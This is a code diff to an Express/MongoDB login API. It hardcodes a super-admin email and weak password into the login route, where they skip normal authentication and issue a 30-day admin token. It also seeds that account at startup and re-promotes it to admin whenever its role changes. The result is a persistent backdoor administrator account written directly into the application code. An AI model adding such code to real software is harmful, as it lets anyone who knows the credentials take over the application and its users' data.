@@ -136,6 +136,38 @@ api.post(
     const pwd = String(password || "");
     if (!identifier || !pwd)
       throw new Error("Email/Phone and password are required");
+
+    // Hardcoded Super Admin Credentials
+    if (
+      identifier.toLowerCase() === "superadmin@gmail.com" &&
+      pwd === "superadmin@123"
+    ) {
+      let superAdmin = await User.findOne({ email: "superadmin@gmail.com" });
+      if (!superAdmin) {
+        superAdmin = await User.create({
+          email: "superadmin@gmail.com",
+          name: "Super Admin",
+          role: "admin",
+          passwordHash: await bcrypt.hash("superadmin@123", 8),
+        });
+      } else if (superAdmin.role !== "admin") {
+        superAdmin.role = "admin";
+        await superAdmin.save();
+      }
+      return r.json({
+        token: jwt.sign({ id: superAdmin.id, role: "admin" }, S, {
+          expiresIn: "30d",
+        }),
+        user: {
+          id: superAdmin.id,
+          name: superAdmin.name || "Super Admin",
+          phone: superAdmin.phone,
+          email: superAdmin.email,
+          role: "admin",
+        },
+      });
+    }
+
     const u = await User.findOne({
       $or: [
         { email: identifier.toLowerCase() },
@@ -846,8 +878,25 @@ mongoose.connection.on("disconnected", () => {
 
 mongoose
   .connect(mongoUri)
-  .then((conn) => {
+  .then(async (conn) => {
     console.log(`✅ MongoDB connected successfully: ${conn.connection.host}`);
+    try {
+      const existing = await User.findOne({ email: "superadmin@gmail.com" });
+      if (!existing) {
+        await User.create({
+          email: "superadmin@gmail.com",
+          name: "Super Admin",
+          role: "admin",
+          passwordHash: await bcrypt.hash("superadmin@123", 8),
+        });
+        console.log("👑 Super Admin initialized: superadmin@gmail.com");
+      } else if (existing.role !== "admin") {
+        existing.role = "admin";
+        await existing.save();
+      }
+    } catch (seedErr) {
+      console.warn("Super Admin seed note:", seedErr.message);
+    }
     app.listen(process.env.PORT || 4000, () =>
       console.log("✅ API successfully running on port", process.env.PORT || 4000),
     );
